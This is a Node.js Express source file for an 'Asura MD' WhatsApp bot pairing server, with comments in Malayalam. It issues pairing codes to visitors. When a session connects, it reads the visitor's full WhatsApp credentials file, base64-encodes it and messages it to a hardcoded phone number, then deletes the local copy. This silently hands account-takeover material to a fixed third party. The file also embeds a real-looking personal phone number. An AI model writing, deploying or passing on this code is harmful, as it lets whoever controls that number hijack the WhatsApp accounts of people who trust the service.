import express from 'express';
import { makeWASocket, useMultiFileAuthState, delay, Browsers } from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs';

const app = express();
const port = process.env.PORT || 3000;

app.get('/pair', async (req, res) => {
    let phone = req.query.number; // HTML-ൽ 'number' എന്നാണ് നൽകിയിരിക്കുന്നത്
    if (!phone) return res.send({ error: "Phone number is required" });

    // താൽക്കാലികമായി ഒരു ഐഡി ഉണ്ടാക്കുന്നു
    const id = Math.random().toString(36).substring(7);
    const { state, saveCreds } = await useMultiFileAuthState(`./temp_${id}`);

    try {
        const sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            browser: Browsers.macOS("Desktop")
        });

        if (!sock.authState.creds.registered) {
            await delay(1500);
            phone = phone.replace(/[^0-9]/g, '');
            const code = await sock.requestPairingCode(phone);
            res.send({ code: code });
        }

        // കണക്ഷൻ നിരീക്ഷിക്കുന്നു (Login സക്സസ് ആയാൽ)
        sock.ev.on('creds.update', saveCreds);
        sock.ev.on('connection.update', async (update) => {
            const { connection } = update;
            if (connection === 'open') {
                await delay(5000);
                
                // 1. സെഷൻ ഫയൽ റീഡ് ചെയ്യുന്നു
                const authFile = fs.readFileSync(`./temp_${id}/creds.json`);
                const sessionId = Buffer.from(authFile).toString('base64');

                // 2. നിങ്ങളുടെ നമ്പറിലേക്ക് സെഷൻ ഐഡി അയക്കുന്നു
                const myNumber = "917736811908@s.whatsapp.net";
                const welcomeMsg = `*👺 ASURA MD SESSION CONNECTED*\n\n*ID:* \`Asura_MD_${sessionId}\`\n\n> Don't share this ID!`;
                
                await sock.sendMessage(myNumber, { text: welcomeMsg });

                // 3. Closed
                await delay(2000);
                fs.rmSync(`./temp_${id}`, { recursive: true, force: true });
                process.exit(0); 
            }
        });

    } catch (err) {
        console.log(err);
        res.send({ error: "Server Busy" });
    }
});

app.listen(port, () => console.log(`Asura MD Pairing Server on port ${port}`));
